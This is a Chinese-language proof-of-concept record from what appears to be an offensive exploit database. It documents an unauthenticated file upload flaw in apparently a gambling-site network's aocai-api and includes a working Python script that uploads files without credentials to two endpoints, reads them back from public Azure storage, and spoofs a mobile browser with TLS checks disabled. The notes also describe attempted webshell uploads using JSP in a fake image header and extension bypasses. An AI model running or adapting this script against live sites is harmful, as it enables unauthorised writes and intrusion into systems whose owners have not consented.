# 菠菜站群 prodSite5 未授权文件上传（attachment/upload + uploadChat，落地 Azure Blob 公网可读）

- **code**: 菠菜站群-prodsite5-未授权文件上传-attachment-upload-uploadchat-落地-azure-blob-公网可读
- **kind**: poc
- **category**: file-upload
- **component**: 菠菜站群 prodSite5 / aocai-api（Spring + Tomcat 10.1.50）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com (203.0.113.59, asset_id=1) 实测：不带任何 Cookie/token 的 POST /aocai-api/attachment/upload 返回 200 `{"result":"0","data":{"id":"6ac21ae5995ef75daee572e4","url":"https://proimageserver-f9cqgnfsahgvaqhu.z01.azurefd.net/image/static/uploads/cash/10/d807be1ac5cb497b9ba370afad28a4b6.png"}}`；回读该 URL → 200 / len=67 / 字节一致。uploadChat 同样未授权落地 /uploads/chat/10/。已存原始请求 HTTP 证据 id=4、5；漏洞 id=1（high, confirmed）。**限制（必须如实说明）**：该点**无法 getshell** —— 内容做真实图片 Magic 校验（JSP 代码体 → 「不是有效的图片文件」）、存储扩展名被强制规范化为 .png（传 .gif/.jpeg/.blob 均落 .png）、换扩展名回读全 404。因此本条是「未授权文件写入」而非「未授权 RCE」。
- **path**: pocs/菠菜站群-prodsite5-未授权文件上传-attachment-upload-uploadchat-落地-azure-blob-公网可读/aocai_unauth_upload.py
- **tags**: 菠菜站群,prodSite5,aocai-api,未授权文件上传,Azure Blob,文件写入
- **created_at**: 2026-10-04T09:35:01.866Z
- **found_by**: exploit

## 描述

菠菜站群 prodSite5 的 /aocai-api/attachment/upload 与 /attachment/uploadChat 两个附件接口不做会话鉴权：不带 Cookie/token 即返回 result=0 并给出公网可读的 Azure Blob URL。可用于未授权文件写入（DoW）与存储探测。注意：服务端有真实图片 Magic 校验 + 强制 .png 落地，因此**不能直接 getshell**，扩展名绕过已实测 15 种全败。

## 用法

```
1) 把 BASE 换成目标站群任意域名（同套 prodSite5 系统通用）；
2) python aocai_unauth_upload.py
3) 判定：返回 `{"result":"0","data":{"id":"...","url":"https://proimageserver-*.azurefd.net/image/static/uploads/<分区>/10/<md5>.png"}}` 即未授权成功；
4) 回读该 URL 返回 200 且字节一致，证明文件已公网可读。
对照接口（需登录）：/aocai-api/upload、/uploadFile、/file/upload → e00006。
落地分区：/uploads/cash/10/ 与 /uploads/chat/10/；管理端分区为 /uploads/mgr/<NN>/。
```

## 正文

```
#!/usr/bin/env python3
"""菠菜站群 prodSite5 未授权文件上传探测 + 落地 Azure Blob 回读验证。
原理：/aocai-api/attachment/upload 与 /attachment/uploadChat 两个附件接口
     **不做任何会话鉴权**（不带 Cookie/token 也返回 result=0），
     文件落地到 Azure Front Door 静态存储，公网可直接回读。
     （对照：/aocai-api/upload、/uploadFile、/file/upload 返回 e00006 需登录）
限制：服务端对内容做**真实图片 Magic 校验**（自造 JPEG 头 + JSP 代码 → 「不是有效的图片文件」），
     且**强制把存储扩展名规范化为 .png**。扩展名绕过（15 种变体）与 blob 白名单均无效。
"""
import json, ssl, urllib.request, urllib.error, uuid

BASE = "https://TARGET"
API = BASE + "/aocai-api/"
CTX = ssl._create_unverified_context()
UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1")
GIF = bytes.fromhex(
    "47494638396101000100800000000000ffffff21f90401000000002c000000000100010000"
    "02024401003b")

def mpart(fname, fdata, ftype="image/gif", bname="file", fields=None):
    b = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    out = b""
    for k, v in (fields or {}).items():
        out += (f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n").encode()
    out += (f"--{b}\r\nContent-Disposition: form-data; name=\"{bname}\"; "
            f"filename=\"{fname}\"\r\nContent-Type: {ftype}\r\n\r\n").encode()
    out += fdata + b"\r\n" + f"--{b}--\r\n".encode()
    return out, f"multipart/form-data; boundary={b}"

def probe(ep, fname, data, ctype, fields=None):
    body, ct = mpart(fname, data, ctype, fields=fields)
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Origin": BASE, "Referer": BASE + "/wap/", "X-Requested-With": "XMLHttpRequest",
         "Content-Type": ct}   # 注意：无 Cookie / 无 token
    r = urllib.request.Request(API + ep.lstrip("/"), data=body, method="POST", headers=h)
    with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
        return resp.status, resp.read().decode("utf-8", "ignore")

if __name__ == "__main__":
    for ep in ["attachment/upload", "attachment/uploadChat"]:
        st, t = probe(ep, "x.png", GIF, "image/gif",
                      fields={"bizType": "1"} if "Chat" not in ep else None)
        print(f"[{ep}] {st} {t}")
        try:
            url = json.loads(t)["data"]["url"]
            with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}),
                                        timeout=20, context=CTX) as rr:
                print(f"   回读 {rr.status} len={len(rr.read())}  ← 未授权文件已公网可读")
        except Exception as e:
            print(f"   回读失败 {e}")

```
